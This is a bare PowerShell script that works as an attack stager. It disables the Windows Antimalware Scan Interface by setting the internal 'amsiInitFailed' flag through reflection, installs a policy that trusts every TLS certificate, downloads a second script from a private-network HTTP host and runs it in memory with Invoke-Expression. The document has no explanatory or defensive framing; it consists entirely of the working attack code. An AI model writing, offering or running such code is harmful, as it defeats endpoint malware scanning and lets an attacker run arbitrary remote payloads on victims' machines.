
$asm = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$asm.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)


$scriptUrl = "http://10.211.55.5:8000/try.ps1"


try {
   
    $webClient = New-Object Net.WebClient
    Add-Type -TypeDefinition "using System.Net; using System.Security.Cryptography.X509Certificates; public class TrustAllCerts : ICertificatePolicy { public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate cert, WebRequest request, int certificateProblem) { return true; } }"
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
    [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCerts
    $scriptContent = $webClient.DownloadString($scriptUrl)
} catch {
    Write-Host "Error downloading: $_"
    exit
}


$null = Invoke-Expression $scriptContent
